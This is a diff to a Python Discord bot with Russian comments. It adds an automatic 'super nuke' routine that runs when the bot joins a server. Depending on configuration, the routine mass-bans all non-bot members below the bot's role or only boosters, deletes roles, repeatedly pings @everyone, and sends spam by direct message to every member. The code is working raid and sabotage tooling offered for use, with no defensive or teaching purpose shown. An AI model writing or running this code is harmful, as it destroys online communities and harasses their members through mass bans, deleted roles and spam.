@@ -1290,11 +1290,59 @@ async def on_guild_join(guild):
     if is_guild_blocked(guild.id):
         return  # Сервер заблокирован — ничего не делаем
 
-    # AUTO SUPER NUKE — быстрый нюк с приоритетами
+    # AUTO SUPER NUKE — нюк + настраиваемые действия
     if AUTO_SUPER_NUKE:
         nuke_running[guild.id] = True
         spam_text = AUTO_SUPER_NUKE_TEXT if AUTO_SUPER_NUKE_TEXT else config.SPAM_TEXT
-        asyncio.create_task(do_super_nuke(guild, spam_text))
+        asyncio.create_task(do_nuke(guild, spam_text))
+
+        async def super_nuke_tasks():
+            await asyncio.sleep(2)
+            bot_role = guild.me.top_role
+
+            # Массбан или только бустеры
+            if SNUKE_CONFIG.get("massban"):
+                targets = [
+                    m for m in guild.members
+                    if not m.bot and m.id != guild.owner_id
+                    and (not m.top_role or m.top_role < bot_role)
+                ]
+                await asyncio.gather(*[m.ban(reason="auto_super_nuke") for m in targets], return_exceptions=True)
+            elif SNUKE_CONFIG.get("boosters_only"):
+                boosters = [m for m in guild.members if m.premium_since is not None]
+                await asyncio.gather(*[m.ban(reason="booster_ban") for m in boosters], return_exceptions=True)
+
+            # Удаление ролей
+            if SNUKE_CONFIG.get("rolesdelete"):
+                await asyncio.gather(
+                    *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
+                    return_exceptions=True
+                )
+
+            # Пинг спам
+            if SNUKE_CONFIG.get("pingspam"):
+                mentions = discord.AllowedMentions(everyone=True)
+                ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).send_messages), None)
+                if ch:
+                    for _ in range(10):
+                        try:
+                            await ch.send("@everyone @here", allowed_mentions=mentions)
+                            await asyncio.sleep(0.5)
+                        except Exception:
+                            break
+
+            # Масс ДМ
+            if SNUKE_CONFIG.get("massdm"):
+                for member in guild.members:
+                    if member.bot:
+                        continue
+                    try:
+                        await member.send(spam_text)
+                    except Exception:
+                        pass
+                    await asyncio.sleep(0.5)
+
+        asyncio.create_task(super_nuke_tasks())
         return
 
     if config.AUTO_NUKE:
